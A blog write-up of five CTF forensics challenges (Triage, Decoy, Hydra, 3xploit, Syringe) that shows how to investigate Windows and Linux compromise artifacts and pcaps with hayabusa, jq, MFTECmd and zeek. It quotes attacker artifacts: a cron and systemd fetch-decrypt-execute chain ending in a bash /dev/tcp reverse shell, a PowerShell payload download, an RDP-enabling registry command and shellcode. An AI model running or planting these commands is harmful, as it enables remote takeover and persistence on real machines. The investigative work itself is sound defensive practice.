---
title: "ICMTC Qualifications 2024 Forensics Writeups"
date: 2024-06-27 13:05:53 +0300
categories: [CTF]
tags: [CTF, Writeup]
description: My approach for solving the qualifications forensics challange.
image:
  path: /assets/images/posts/2024-06-27-icmtcQal/head.png
---

Al-Salaam Alaikum, this is Mohamed El-feky aka “sphinky”, and I like to share my approach with details for solving the forensics challenge of the qualification round.

## **Triage**

![](/assets/images/posts/2024-06-27-icmtcQal/Triage.png)

At the start of the Challenge you are given collected files from C drive of a windows machine and a pcap file. The task is to solve those questions:
### Questions
1. What is the Name and Process ID of the milicious Executable?	
2. What is the name of the process that executed the malicious executable?
3. The malicious files dropped two files what are their name?	
4. One of those dropped files has executed cmd, what was the writtien command?	
5. What is the full path of the parent image that executed the cmd?	
6. At the PCAP what is the IP address of the C2 that the malware was trying to connect to and what was the Source Port?	

From the Qs we can see that there is a malware that ran on the machine and dropped two malicious files which one of them executed a command in cmd, and the malware tried to connect to its C2.

I like starting by looking into the windows logs specially when there is sysmon logs, for this task I will use hayabusa which is a great threat hunting tool you can check it out here, also I will use a windows machine with a WSL for solving all the forensics challenges. The tool require command and some options, I will use json-timeline command to get a full time of what happened on the machine from the logs and I will just provide it with the path to win logs 



```
$ ~/tools/hayabusa-2.14.0-win-x64.exe json-timeline -d ./C/Windows/System32/winevt/logs/ -o timeline.json 

┏┓ ┏┳━━━┳┓  ┏┳━━━┳━━┓┏┓ ┏┳━━━┳━━━┓
┃┃ ┃┃┏━┓┃┗┓┏┛┃┏━┓┃┏┓┃┃┃ ┃┃┏━┓┃┏━┓┃
┃┗━┛┃┃ ┃┣┓┗┛┏┫┃ ┃┃┗┛┗┫┃ ┃┃┗━━┫┃ ┃┃
┃┏━┓┃┗━┛┃┗┓┏┛┃┗━┛┃┏━┓┃┃ ┃┣━━┓┃┗━┛┃
┃┃ ┃┃┏━┓┃ ┃┃ ┃┏━┓┃┗━┛┃┗━┛┃┗━┛┃┏━┓┃
┗┛ ┗┻┛ ┗┛ ┗┛ ┗┛ ┗┻━━━┻━━━┻━━━┻┛ ┗┛
   by Yamato Security

Start time: 2024/06/26 18:25

Total event log files: 97
Total file size: 54.7 MB

Scan wizard:

✔ Which set of detection rules would you like to load? · 5. All event and alert rules (4,356 rules) ( status: * | level: informational+ )
✔ Include deprecated rules? (204 rules) · yes
✔ Include unsupported rules? (45 rules) · yes
✔ Include noisy rules? (12 rules) · yes
✔ Include sysmon rules? (3,632 rules) · yes
```

After it finish it will provide a summary of its detections like this:

```
╭─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ Top critical alerts:                                              Top high alerts:                                              │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Defender Alert (Severe) (4)                                       Important Log File Cleared (3)                                │
│ n/a                                                               Windows Defender Real-time Protection Disabled (2)            │
│ n/a                                                               Windows Defender Threat Detection Disabled (2)                │
│ n/a                                                               New RUN Key Pointing to Suspicious Folder (1)                 │
│ n/a                                                               Suspicious Eventlog Clear or Configuration Change (1)         │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Top medium alerts:                                                Top low alerts:                                               │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Uncommon New Firewall Rule Added In Windows Firewall E... (328)   Process Start From Suspicious Folder (7)                      │
│ Reg Key Value Set (Sysmon Alert) (53)                             Firewall Rule Modified In The Windows Firewall Excepti... (6) │
│ File Created (Sysmon Alert) (30)                                  Creation of an Executable by an Executable (2)                │
│ Potentially Malicious PwSh (21)                                   Credential Manager Enumerated (2)                             │
│ Reg Key Create/Delete (Sysmon Alert) (9)                          Possible Timestomping (1)                                     │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Top informational alerts:                                                                                                       │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Proc Exec (80)                                                    Logon (Service) (Noisy) (10)                                  │
│ Bits Job Created (74)                                             Device Conn (9)                                               │
│ WMI Provider Started (69)                                         Proc Terminated (7)                                           │
│ New Application in AppCompat (13)                                 Temporary WMI Event Consumer (6)                              │
│ DNS Query (12)                                                    RDS Sess Start (Noisy) (5)                                    │
╰─────────────────────────────────────────────────────────────────╌───────────────────────────────────────────────────────────────╯

```

Since I am looking for malicious process the low alert **Process Start From Suspicious Folder** is good lead to start with. I will use the jq utility while inspecting the timeline.json. 

```
$ jq '.|select(.RuleTitle=="Process Start From Suspicious Folder")' timeline.json
{
  "Timestamp": "2024-06-02 13:40:08.679 +03:00",
  "RuleTitle": "Process Start From Suspicious Folder",
  "Channel": "Sysmon",
  "EventID": 1,
  "Details": {
    "Cmdline": "\"C:\\Users\\memsh\\Desktop\\Firefox.exe\"",
    "ParentCmdline": "C:\\Windows\\Explorer.EXE",
    "PID": 1864,
    "ParentPID": 2340,
    "Hashes": "MD5=0EC7425D2A0FF149D89DB3E0347DEBE3,SHA256=DBDDBF3B43A5D9CBFC20359EF87A295045A2BA9306ED0C62C018073E91F60D78,IMPHASH=3EAA732D4DAE53340F9646BDD85DAC41"
  }
}
{
  "Timestamp": "2024-06-02 13:41:05.040 +03:00",
  "RuleTitle": "Process Start From Suspicious Folder",
  "Channel": "Sysmon",
  "EventID": 1,
  "Details": {
    "Cmdline": "\"C:\\Users\\memsh\\Desktop\\Firefox.exe\"",
    "ParentCmdline": "C:\\Windows\\Explorer.EXE",
    "PID": 6172,
    "ParentPID": 2340,
    "Hashes": "MD5=0EC7425D2A0FF149D89DB3E0347DEBE3,SHA256=DBDDBF3B43A5D9CBFC20359EF87A295045A2BA9306ED0C62C018073E91F60D78,IMPHASH=3EAA732D4DAE53340F9646BDD85DAC41"
  }
}
[TRUNCATED]
```

I deleted some lines of the output and kept some of the needed info like Cmdline, PID, ParentPID, Hashes. There is total 7 alerts about process start from sus folder, 2 for firefox.exe, 2 for Autopatch.exe, 1 for xJX.exe and 2 for gkape.exe. We focus on firefox.exe since it is the first to run in the timeline, and confirm it is really the malicious process by checking its SHA256 hash on virustotal and find its a Trojan.

![](/assets/images/posts/2024-06-27-icmtcQal/04.png)

We have two instance of firefox.exe but only the second instance PID is the correct answer for `Q1 {Firefox.exe:6172}`, ig that is because it carry the ParentPID for the instances of Autopatch.exe. For Q2 we can use the ParentCmdline or ParentPID to get the answer `Q2 {Explorer.EXE}`. 
After searching the firefox.exe hash in virustotal if we inspect the Relations tab in the Bundled Files you see one of them is AutoPatch.exe, and if you get back to timeline.json and see the ParentPID of xJX.exe it belong to AutoPatch.exe so those are the two dropped files for `Q3{Autopatch.exe:xJX.exe}`	

Since we know the PID of both the running dropped files (8880,4032) we can use them to know which one executed the cmd by searching a process with a ParentPID (8880 or 4032), so back to jq with this query
```
$ jq '.|select(.Details.ParentPID==4032)' timeline.json
{
  "Timestamp": "2024-06-02 13:41:33.395 +03:00",
  "RuleTitle": "Proc Exec",
  "Channel": "Sysmon",
  "EventID": 1,
  "Details": {
    "Cmdline": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\memsh\\AppData\\Local\\Temp\\3a5e6da9.bat\" \"",
    "Proc": "C:\\Windows\\SysWOW64\\cmd.exe",
    "ParentCmdline": "C:\\Users\\memsh\\AppData\\Local\\Temp\\xJX.exe",
    "PID": 4132,
    "ParentPID": 4032,
  }
}
```
Again I removed some lines of the output, we can see that the cmd.exe ran as a child of xJX.exe and the written command is `Q4{C:\Users\memsh\AppData\Local\Temp\3a5e6da9.bat}`. It is better to get the answer from the Sysmon log itself since there is a lot of escape characters in timeline.json. Also we can see that the full path of the parent image that executed the cmd `Q5 {C:\Users\memsh\AppData\Local\Temp\xJX.exe}`, you can answer both of the previous Qs from Sysmon log if you filtered with "ParentProcessId: 4032" as text in description.

For Q6 you need to inspect the pcap file, I went to `Statistics>Conversations` to see there is 12 IPv4 conversation, selected them one by one but only the conversion with `53` seemed like a trial to connect to the server not an actual connection like the Q6 stated `{51.222.173.101:50256}`


![](/assets/images/posts/2024-06-27-icmtcQal/03.png)



## **Decoy**

![](/assets/images/posts/2024-06-27-icmtcQal/Decoy.png)

Again you are given collected files from C drive of a windows machine. 
### Questions
1. what is the name of malicious process that ran on machine?
2. The attacker needed to make sure that RDP is always available, what command did the attacker use to ensure that?
3. There is a persistence technique used on the machine, What is the ID of this technique?	
4. What is the name of script that the persistence technique used 
5. What file does the script try to download?	
6. A file name "All_Is_Fine.txt" was renamed, what was it is former name?
7. There was another file that existed in the same directory as Q6, what its name?

I will start again with hayabusa tool to have a timeline and inspect the alerts that are triggered. I will use json-timeline command to get a full time of what happened on the machine from the logs and I will just provide it with the path to win logs
```
$ ~/tools/hayabusa-2.14.0-win-x64.exe json-timeline -d ./C/Windows/System32/winevt/logs/ -o timeline.json 

┏┓ ┏┳━━━┳┓  ┏┳━━━┳━━┓┏┓ ┏┳━━━┳━━━┓
┃┃ ┃┃┏━┓┃┗┓┏┛┃┏━┓┃┏┓┃┃┃ ┃┃┏━┓┃┏━┓┃
┃┗━┛┃┃ ┃┣┓┗┛┏┫┃ ┃┃┗┛┗┫┃ ┃┃┗━━┫┃ ┃┃
┃┏━┓┃┗━┛┃┗┓┏┛┃┗━┛┃┏━┓┃┃ ┃┣━━┓┃┗━┛┃
┃┃ ┃┃┏━┓┃ ┃┃ ┃┏━┓┃┗━┛┃┗━┛┃┗━┛┃┏━┓┃
┗┛ ┗┻┛ ┗┛ ┗┛ ┗┛ ┗┻━━━┻━━━┻━━━┻┛ ┗┛
   by Yamato Security

Start time: 2024/06/26 19:49

Total event log files: 115
Total file size: 35.4 MB

Scan wizard:

✔ Which set of detection rules would you like to load? · 5. All event and alert rules (4,356 rules) ( status: * | level: informational+ )
✔ Include deprecated rules? (204 rules) · yes
✔ Include unsupported rules? (45 rules) · yes
✔ Include noisy rules? (12 rules) · yes
✔ Include sysmon rules? (3,632 rules) · yes

[TRUNCATED]

╭─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ Top critical alerts:                                              Top high alerts:                                              │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Antivirus Password Dumper Detection (1)                           User Added To Local Admin Grp (2)                             │
│ n/a                                                               HackTool - Mimikatz Execution (1)                             │
│ n/a                                                               Potential Tampering With RDP Related Registry Keys Via... (1) │
│ n/a                                                               Defender Alert (High) (1)                                     │
│ n/a                                                               Windows Defender Real-time Protection Disabled (1)            │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Top medium alerts:                                                Top low alerts:                                               │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Uncommon New Firewall Rule Added In Windows Firewall E... (310)   Rare Service Installations (6)                                │
│ WMI Persistence (3)                                               Credential Manager Accessed (6)                               │
│ Elevated System Shell Spawned (2)                                 Group Modification Logging (5)                                │
│ n/a                                                               File Enumeration Via Dir Command (5)                          │
│ n/a                                                               Renamed Exe File (5)                                          │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Top informational alerts:                                                                                                       │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ Proc Exec (298)                                                   Logon (Interactive) (Noisy) (19)                              │
│ Proc Terminated (245)                                             Explicit Logon (Noisy) (16)                                   │
│ Logon (Service) (Noisy) (68)                                      Svc Installed (6)                                             │
│ WMI Provider Started (41)                                         Logon (Interactive) *Creds in memory* (6)                     │
│ Bits Job Created (35)                                             Admin Logon (6)                                               │
╰─────────────────────────────────────────────────────────────────╌───────────────────────────────────────────────────────────────╯
```

There a high alert about Tampering With RDP Related Registry Keys so I checked it 
```
$ jq '.|select(.RuleTitle=="Potential Tampering With RDP Related Registry Keys Via Reg.EXE")' timeline.json
{
  "Timestamp": "2024-05-30 14:28:43.542 +03:00",
  "RuleTitle": "Potential Tampering With RDP Related Registry Keys Via Reg.EXE",
  "Level": "high",
  "Channel": "Sysmon",
  "EventID": 1,
  "Details": {
    "Cmdline": "reg add \"hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections /t reg_dword /d 0",
    "Proc": "C:\\Windows\\System32\\reg.exe",
    "User": "DESKTOP-EIN36FN\\The_Lab",
    "ParentCmdline": "\"C:\\Windows\\system32\\cmd.exe\"",
    "Hashes": "SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D"
  }
}
```
So the command try to modify an existing entry in the Windows Registry at the provided path and the '/f' forces the command to execute without prompting for confirmation, fDenyTSConnections is a DWORD value that controls whether Remote Desktop connections are denied or allowed, and the value 0 means that connections are allowed. So this is for `Q2{reg  add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t reg_dword /d 0}`, better to get the exact command from the sysmon log.

Also from the Top high alerts we can see that there is a presence of Mimikatz which is a commonly used tool for extracting sensitive information and that is for `Q1{mimikatz.exe}`. At first I wasn't sure if this was the correct answer since there is a relative time gap between the presence of Mimikatz (2024-05-27 12:04:03) and the modification of RDP registry key (2024-05-30 14:28:43) as I tried to make things related to each other, but couldn't find any other process.

The next question ask about persistence technique and script, a common place to check is C:\Windows\System32\Tasks and you will find a task named as a legit scheduled task Microsoft_Update, if you opened it in text editor you see
```
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-05-30T04:36:36.1733171</Date>
    <Author>DESKTOP-EIN36FN\The_Lab</Author>
    <URI>\Microsoft_Update</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Settings>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\The_Lab\Downloads\totheroots.ps1</Command>
    </Exec>
  </Actions>
</Task>
```

I deleted a couple of lines of it but we can see it execute a script called totheroots.ps1 `Q4{totheroots.ps1}` from Downloads folder which is unrelated to Microsoft_Update. Checking Mitre framework for the ID of Scheduled Task/Job at Persistence section its T1053 `Q3{T1053}`

Now we need to get what file did the script try to download, I though since the script is probably small in size its data will be resident in the its MFT record, but the file itself wasn't in the MFT. I kept searching and found a deleted file in the Recyclebin, when I checked the file that start with $I (Info Metadata) it showed it belonged to totheroots.ps1. The actual content is in the file that start with $R and it was base64 encoded, decoding it we get:
```
Invoke-WebRequest http:\\21.36.124.5\This_Is_Malicious\craaaack.zip
```
So the answer for Q5 is `Q5{craaaack.zip}`. You may get the answer also from the Edge History sqlite db in urls table
![](/assets/images/posts/2024-06-27-icmtcQal/sqlite db.png)

For the last two Qs getting the filename before its renamed and the other filename in the same directory we need to process the $J stream is part of the $UsnJrnl. For this task I'll use EricZimmerman MFTECmd tool which require providing both the $J and $MFT in order to get the journaling of the files
```
$ ~/tools/MFTECmd/MFTECmd.exe -f ./C/\$Extend/\$J -m ./C/\$MFT --json . --jsonf mft.json
```
Then I'll just open the file in text editor and search for "All_Is_Fine.txt", notice a line before the first match line there is a file with the same EntryNumber, and in UpdateReasons there is RenameOldName and RenameNewName

```
{"Name":"Hacked_Lab.txt","Extension":".txt","EntryNumber":101270,"SequenceNumber":5,"ParentEntryNumber":100715,"ParentSequenceNumber":6,"ParentPath":".\\Users\\The_Lab\\Desktop","UpdateSequenceNumber":27712672,"UpdateTimestamp":"2024-05-30T11:38:26.9081328+00:00","UpdateReasons":"RenameOldName","FileAttributes":"Archive","OffsetToData":27712672,"SourceFile":"./C/$Extend/$J"}
{"Name":"All_Is_Fine.txt","Extension":".txt","EntryNumber":101270,"SequenceNumber":5,"ParentEntryNumber":100715,"ParentSequenceNumber":6,"ParentPath":".\\Users\\The_Lab\\Desktop","UpdateSequenceNumber":27712760,"UpdateTimestamp":"2024-05-30T11:38:26.9081328+00:00","UpdateReasons":"RenameNewName","FileAttributes":"Archive","OffsetToData":27712760,"SourceFile":"./C/$Extend/$J"}

```

That is for `Q6{Hacked_Lab.txt}`. For the last Q use the parent info from the previous records and search with ""ParentEntryNumber":100715,"ParentSequenceNumber":6" you will get a couple of hits one of them is the answer for `Q7{violent.txt}`.



## **Hydra**


![](/assets/images/posts/2024-06-27-icmtcQal/Hydra.png)

For this challenge you are given the part of the var dir and the etc dir. You know that the attacker installed a backdoor on that machine and the task is to get the IP/port of the attacker.
Before starting its good to read about Linux persistence techniques and backdoor.

I started by going to var dir at first to see what possibly could be logged in it. At `var\spool\cron\crontabs` there is a file called `g33k` (it is themed with the author username) that contains:
```
# m h  dom mon dow   command
0 23 * * 1 sudo systemctl start legit.service
1 23 * * 1 sudo systemctl enable legit.service
1 23 * * 1 sudo /etc/init.d/initial.sh
```
It show a cron jobs that will run once each week. Lets find and check the content if those files.
```
$ find . -iname legit.service
./etc.tar/etc/systemd/system/legit.service
$ find . -iname initial.sh
./etc.tar/etc/init.d/initial.sh
$ cat ./etc.tar/etc/systemd/system/legit.service
[UNIT]

Description="4261636b646f6f72"

[Service]
Type=simple
ExecStart=curl https://raw.githubusercontent.com/0x01g33k/you_know_you-re_on_the_right_track/main/encrypted.sh -o /tmp/shell.sh

[Install]
WantedBy=multi=user.target
$ cat ./etc.tar/etc/init.d/initial.sh
#!/bin/bash

openssl rsautl -decrypt -inkey id_rsa.pem -in /tmp/shell.sh | bash
```
So it curl an encrypted shell from the previous link to `/tmp/shell.sh`, then decrypt it with `id_rsa.pem` key and finally execute it. So we just need to do the same, curl the same encrypted shell, find the key and decrypt the shell but no need to execute it.
```
$curl https://raw.githubusercontent.com/0x01g33k/you_know_you-re_on_the_right_track/main/encrypted.sh
$ find . -iname id_rsa.pem
./etc.tar/etc/.ssh/id_rsa.pem
$ openssl rsautl -decrypt -inkey ./etc.tar/etc/.ssh/id_rsa.pem -in encrypted.sh
The command rsautl was deprecated in version 3.0. Use 'pkeyutl' instead.
#!/bin/bash
bash -i >& /dev/tcp/41.35.61.53/52385 0>&1
```
Now we can see the attacker socket `{41.35.61.53:52385}`



## **3xploit**

![](/assets/images/posts/2024-06-27-icmtcQal/3xplOt.png)

For this challenge you are given two files audit.log A log file used by the Linux Auditing System that records detailed information about various system activities, including authentication attempts, executed commands, and other security-relevant events and auth.log which is a log file that records authentication-related events, such as both successful and failed login attempts, as well as other authentication-related actions. We need to answer those questions:

### Questions
1. What is the attacker's IP?
2. The username he used to login?
3. Submit a flag
4. Absolute path for the malicious file?
5. What is the CVE the attacker tried to exploit?
6. What is the mitre att&ck id for the behaviour of the attacker after exploitation? 
7. how many success logins the attacker performed?

From the questions we know that there is an attacker that managed to login on the server and created a malicious file to exploit a vulnerability on the system. I will start by looking at auth.log and will use Notepad++ since it automatically highlight the duplication of the selected word and make it easier to read such a log file. When you spot the word "Failed" you can see 12 failed password for a user named madoushi from 3 different IP which seem like an abnormal behaviour and suitable for an attacker, then there is "Accepted publickey for madoushi from 37.53.132.10" so that make it for `Q1{37.53.132.10}` and `Q2{madoushi}`. Pay attention for the time of madoushi login as there is another user "amany" will login in the same time (this is related to how the exploit work) which so far showed a normal behaviour.

The attacker (madoushi) then execute this 
```
/usr/bin/perl -e 'print "\x90"x100 . "\xcc"x4 . "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
```
which is a shellcode that will exploit the vulnerability in the system, but what actually is the vulnerability? a couple of lines later there is a base64 encoded text that if you decoded it and converted it from hex you get openssh_CVE-2023 (which is also answer for `Q3{openssh_CVE-2023}`). searching it leads to CVE-2023-38408 (answer for `Q5{CVE-2023-38408}`) which is a vulnerability was found in OpenSSH where the PKCS#11 feature in the ssh-agent in OpenSSH has an insufficiently trustworthy search path, leading to remote code execution if an agent is forwarded to an attacker-controlled system. The steps of the cve is:
1. The Attacking user(madoushi) connects via SSH to the server.
2. A normal user(amany) is also connected via ssh on the server.
3. Attacker creates shellcode to send via ssh process to target server(/usr/bin/perl -e).
4. The shellcode sent by the attacker exploits the PKCS#11 vulnerability of the ssh-agent and creates a new process hijacking the ssh access of the user amany.
5. Still through the normal access of the attacker, it is possible to execute operational commands by the user amany(/usr/bin/echo NmYgNzAgNjUgNmUgNzMgNzMgNjggNWYgNDMgNTYgND== ).

Now it make sense why did the user amany echoed such an abnormal text in the same time window of the attacker access on the server, because the attacker hijacked the ssh access of user amany.
After that the attacker with user madoushi will nano the exploit to the file /tmp/exploit.py (answer for `Q4{/tmp/exploit.py}`) and will execute it `/usr/bin/python3 /tmp/exploit.py` and this behaviour correspond to Command and Scripting Interpreter: Python technique (answer for `Q6{T1059.006}`). I got stuck for while in Q6 since I was thinking cating /etc/shadow and /etc/passwd correspond to OS Credential Dumping: /etc/passwd and /etc/shadow, but that was wrong. For the last Q I don't know if hijacking the ssh access of user amany is considered as "success login", but the answer is 2 `Q7{2}`.



## **Syringe**

![](/assets/images/posts/2024-06-27-icmtcQal/Syringe.png)

For this challenge you are given a pcap file, and the task is to answer some questions.

### Questions
1. What's the attacker IP? 
2. What is name of vulnerable script?
3. What is the name of the tool attacker used to automate his attack?
4. What is the table name that contains the website users data?

I have a zeek image on docker desktop and will use it to generate logs about the pcap file to make things easier. I just open a powershell terminal in the folder that contains the pcap file and execute this
```
>docker run -it --name zeek -v .\:\findMeHere zeek/zeek:latest
#cd \\findmehere/
#zeek -r Syringe.pcapng /usr/local/zeek/share/zeek/policy/frameworks/files/extract-all-files.zeek local
#exit
>docker rm zeek
```
The `zeek -r Syringe.pcapng` will generate the logs while `extract-all-files.zeek` will extract any file in the pcap just in case. 
The logs generated are
```
capture_loss.log  conn.log  files.log  http.log  loaded_scripts.log  notice.log  packet_filter.log  reporter.log  stats.log  telemetry.log  weird.log
```
Usually I start by `conn.log` to see what IPs talk to which servers and identify the service from port number which come in handy, but for this challenge we need only the `http.log`
I will just execute `less -S http.log` and go through it 

On the most left we got the source ip, and on the right most we got the uri which appear to be SQLI attempts. That totally appear to be the attacker behaviour, so the attacker IP for `Q1{165.1.1.2}`. And the vulnerable script `Q2{search.php}` since the attack was successfully carried on it.

![](/assets/images/posts/2024-06-27-icmtcQal/01.png)

If we continued in `http.log` we can see that the tool used for this attack is `Q3{sqlmap}`, and the table name that contains the website users data `Q4{customers}`.

![](/assets/images/posts/2024-06-27-icmtcQal/02.png)

